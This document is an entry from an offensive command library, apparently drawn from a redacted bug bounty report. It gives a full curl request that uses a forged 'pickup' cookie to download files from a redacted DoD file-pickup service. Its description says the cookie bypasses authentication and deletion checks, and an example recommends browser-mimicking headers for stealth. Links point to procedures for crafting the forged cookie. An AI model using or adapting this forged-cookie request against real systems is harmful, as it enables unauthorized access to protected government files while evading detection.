---
id: cmd-496326-download
data: >-
  curl -X GET
  "https://███████/████████/Download.aspx?PackageID=15849581&FileName=dog.jpg"
  -H "Host: ███████" -H "Connection: close" -H "Upgrade-Insecure-Requests: 1" -H
  "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)
  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" -H
  "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
  -H "Referer: https://█████/██████████/pickupfiles.aspx?id=15849581" -H
  "Accept-Language: en-US,en;q=0.9" -H "Cookie:
  pickup=Subject=&PackageID=MTU4NDk1ODE=████" --output dog.jpg
tags:
  - http
  - download
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:10.887Z'
verified: false
validated: true
submitted: true
---
# send-forged-download-request

## Command

```bash
curl -X GET "https://███████/████████/Download.aspx?PackageID=15849581&FileName=dog.jpg" \
  -H "Host: ███████" \
  -H "Connection: close" \
  -H "Upgrade-Insecure-Requests: 1" \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36" \
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" \
  -H "Referer: https://█████/██████████/pickupfiles.aspx?id=15849581" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Cookie: pickup=Subject=&PackageID=MTU4NDk1ODE=████" \
  --output dog.jpg
```

## Description

Sends an HTTP GET request to download a file from the DoD system using a forged cookie to bypass authentication and deletion checks. Use when exploiting insecure cookie generation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `PackageID` | File identifier (e.g., 15849581) | Yes |
| `FileName` | Name of the file to download (e.g., dog.jpg) | Yes |
| `Cookie` | Forged pickup cookie with encoded ID and hashes | Yes |
| `--output` | File to save response body to | No |

## Examples

### Basic Usage

```bash
curl -X GET "https://target/Download.aspx?PackageID=15849581&FileName=dog.jpg" -H "Cookie: pickup=..." --output dog.jpg
```

### Advanced Usage

Include full headers as shown for stealthier requests mimicking browser behavior.

```bash
curl ... (full command above)
```

## Expected Output

HTTP 200 OK with binary file content in the response body, saved to dog.jpg. No auth errors or deletion messages.

## Related

- [[procedures/Craft-Forged-Download-Cookie]]
- [[procedures/Download-File-with-Forged-Cookie]]
